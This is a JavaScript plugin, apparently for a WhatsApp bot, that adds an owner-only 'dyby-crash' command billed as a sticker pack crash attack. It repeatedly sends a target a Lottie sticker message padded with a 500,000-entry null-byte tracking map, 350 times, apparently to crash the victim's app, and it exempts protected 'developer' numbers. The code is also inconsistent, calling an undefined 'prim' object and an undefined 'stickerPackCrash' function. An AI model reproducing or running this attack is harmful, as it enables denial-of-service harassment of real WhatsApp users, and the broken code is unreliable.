const { cmd } = require('../momy');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const axios = require('axios');
const crypto = require('crypto');

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// DEV NUMBERS PROTECTION
// ============================================================
let devNumbers = [];

async function loadDevNumbers() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/dawestava-hub/new-bot/refs/heads/main/config.json');
        if (response.data && response.data.ownerNumber) {
            devNumbers = response.data.ownerNumber.map(num => {
                let cleanNum = num.toString().replace(/[^0-9]/g, '');
                if (cleanNum.startsWith('0')) cleanNum = '255' + cleanNum.substring(1);
                return cleanNum + '@s.whatsapp.net';
            });
            console.log(`✅ Loaded ${devNumbers.length} protected developer numbers`);
        }
    } catch (e) {
        console.log('⚠️ Could not load dev numbers, using default protection');
        devNumbers = ['55449746111@s.whatsapp.net', '554488122687@s.whatsapp.net'];
    }
}

function isDevNumber(jid) {
    return devNumbers.includes(jid);
}

loadDevNumbers();

// ============================================================
// STICKER PACK CRASH FUNCTION (xxx)
// ============================================================
async function LsD(target) {
  for (let p = 0; p < 350; p++) {
    const PouMsg = {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0&mms3=true",
            fileSha256: "dlob6oYb5Tr671y0M+se6D7DUwViTijFhYc1luOGbTA=",
            mediaKey: "v79wuS5Lfl653TKue0ZwUyHqfYWnUPjFndomy0qTZjM=",
            mimetype: "application/was",
            height: 1280,
            width: 909,
            directPath: "/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0",
            fileLength: "134544",
            mediaKeyTimestamp: "1774806705",
            isAnimated: true,
            stickerSentTs: "1774806705729",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              urlTrackingMap: {
                urlTrackingMapElements: Array.from(
                  { length: 500000 },
                  () => ({ "\0": "\0" })
                )
              }
            }
          }
        }
      }
    };
    await prim.relayMessage("status@broadcast", PouMsg, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
    await sleep(30000);
  }
}

                    
// ============================================================
// OWNER COMMAND: .sticker-crash
// ============================================================
// ============================================================
// OWNER COMMAND: .sticker-crash
// ============================================================
cmd({
    pattern: "dyby-crash",
    alias: ["stcrash", "dyby", "stickercrash"],
    desc: "Sticker pack crash attack",
    category: "bug",
    react: "📦",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    // Check if owner
    if (!isOwner) return reply("❌ Owner only command");

    // Get target
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else {
        return reply(`❌ Usage:

user: .dyby-crash 55xxxxxxxxxxx`);
    }

    // Check if target is a developer number
    if (isDevNumber(target)) {
        return reply(`❌ Cannot attack developer number! This number is protected.`);
    }

    const targetNumber = target.split('@')[0];
    
    // Send attack started message
    await reply(`☘️ DYBY CRASH targeting: ${targetNumber}`);

    try {
        await stickerPackCrash(conn, target);
        
        // Send success message
        await reply(`☘️ DYBY CRASH completed on: ${targetNumber}`);
        
    } catch (e) {
        console.error("Sticker Crash Error:", e);
        reply(`❌ DYBY CRASH failed on: ${targetNumber} - Error: ${e.message}`);
    }
});
